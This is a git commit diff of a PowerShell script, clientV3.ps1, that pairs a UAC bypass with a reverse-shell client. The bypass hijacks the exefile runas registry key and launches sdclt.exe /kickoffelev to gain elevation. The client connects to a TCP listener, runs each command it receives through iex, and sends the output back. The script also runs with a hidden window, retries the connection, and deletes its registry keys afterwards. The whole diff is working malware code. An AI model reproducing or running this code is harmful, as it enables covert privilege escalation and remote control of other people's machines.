9a9b8f7747ec48c48cc919cd21de8403986553c2
noamz1 <32007964+noamz1@users.noreply.github.com>
2017-10-02 00:38:30 +0300

    Update clientV3.ps1

--- clientV3.ps1
+++ clientV3.ps1
@@ -1,19 +1,64 @@
-﻿function Invoke-SDCLTBypass {
-
-
-    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
-    Param (
-        [Parameter(Mandatory = $True)]
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $Command,
-
-        [Switch]
-        $Force
-    )
+$client ={  
+ 
+    $address = 'localhost'
+    $port = 8000
+ 
+    while ($true) {
+        do {
+            try {
+                #Write-Host "Trying to reach "$address":"$port
+                $client = New-Object System.Net.Sockets.TcpClient($address, $port) 
+                $stream = $client.GetStream()
+                $writer = New-Object System.IO.StreamWriter($stream)
+                $reader = New-Object System.IO.StreamReader($stream)
+                break
+            }
+            catch {
+                Start-Sleep -s 10
+            }
+        } while ($true)
+   
+        #Write-Host "Connected"
+        # Execute commands sent by the server, and return output
+        try {
+            do {
+                $cmd = $reader.ReadLine()
+                if ($cmd -eq 'exit') {
+                    #Write-Host "Exiting"
+                    break
+                }
+               try {
+                    $output = [string](iex $cmd)
+                }
+                catch {
+                    $output = $_.Exception.Message
+                }
+                $writer.WriteLine($output)
+                $writer.Flush()
+            } while($true)
+        }
+        catch {
+            #Write-Host $_.Exception.Message
+        }
+   
+        # Cleanup
+        $writer.Close()
+        $reader.Close()
+        $stream.Close()
+        $client.Close()
+        }
+ 
+}
+ 
+ 
+$Command = "powershell -nop -window 1 $client "
+ 
+$Force = $True
+ 
+ 
     $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
     $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
-
+ 
     if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
         "UAC is set to 'Always Notify'. This module does not bypass this setting."
         exit
@@ -21,7 +66,7 @@
     else{
         #Begin Execution
         $exeCommandPath = "HKCU:\Software\Classes\exefile\shell\runas\command"
-
+ 
         if ($Force -or ((Get-ItemProperty -Path $exeCommandPath -Name 'IsolatedCommand' -ErrorAction SilentlyContinue) -eq $null)){
             New-Item $exeCommandPath -Force |
                 New-ItemProperty -Name 'IsolatedCommand' -Value $Command -PropertyType string -Force | Out-Null
@@ -29,100 +74,37 @@
             Write-Warning "Key already exists, consider using -Force"
             exit
         }
-
+ 
         if (Test-Path $exeCommandPath) {
             Write-Verbose "Created registry entries to hijack the exe runas extension"
         }else{
             Write-Warning "Failed to create registry key, exiting"
             exit
         }
-
+ 
         $sdcltPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'sdclt.exe'
-        if ($PSCmdlet.ShouldProcess($sdcltPath, 'Start process')) {
-            $Process = Start-Process -FilePath $sdcltPath -ArgumentList '/kickoffelev' -PassThru
-            Write-Verbose "Started sdclt.exe"
-        }
-
-        #Sleep 5 seconds 
+       
+        $Process = Start-Process -FilePath $sdcltPath -ArgumentList '/kickoffelev' -PassThru
+        Write-Verbose "Started sdclt.exe"
+       
+ 
+        #Sleep 5 seconds
         Write-Verbose "Sleeping 5 seconds to trigger payload"
         if (-not $PSBoundParameters['WhatIf']) {
             Start-Sleep -Seconds 5
         }
-
+ 
+ 
         $exefilePath = "HKCU:\Software\Classes\exefile"
-
+ 
         if (Test-Path $exefilePath) {
             #Remove the registry entry
             Remove-Item $exefilePath -Recurse -Force
             Write-Verbose "Removed registry entries"
         }
-
+ 
         if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
             Stop-Process -Id $Process.Id
             Write-Verbose "Killed running sdclt process"
         }
     }
-}
-
-$client ={   
-
-
-
-
-
-
-
-
-
-
-
-$address = 'localhost'
-      $port = 8000
-while ($true) {
-    do {
-        try {
-            #Write-Host "Trying to reach "$address":"$port
-            $client = New-Object System.Net.Sockets.TcpClient($address, $port)  
-            $stream = $client.GetStream()
-            $writer = New-Object System.IO.StreamWriter($stream)
-            $reader = New-Object System.IO.StreamReader($stream)
-            break
-        }
-        catch {
-            Start-Sleep -s 10
-        }
-    } while ($true)
-    
-    #Write-Host "Connected"
-    # Execute commands sent by the server, and return output
-    try {
-        do {
-            $cmd = $reader.ReadLine()
-            if ($cmd -eq 'exit') {
-                #Write-Host "Exiting"
-                break
-            }
-            try {
-                $output = [string](iex $cmd)
-            }
-            catch {
-                $output = $_.Exception.Message
-            }
-            $writer.WriteLine($output)
-            $writer.Flush()
-        } while($true)
-    }
-    catch {
-        #Write-Host $_.Exception.Message
-    }
-    
-    # Cleanup
-    $writer.Close()
-    $reader.Close()
-    $stream.Close()
-    $client.Close()
-}}
-
-
-Invoke-SDCLTBypass -command  "powershell -nop -window 1 $client " -force
-Remove-Item C:\Users\clientV3.ps1
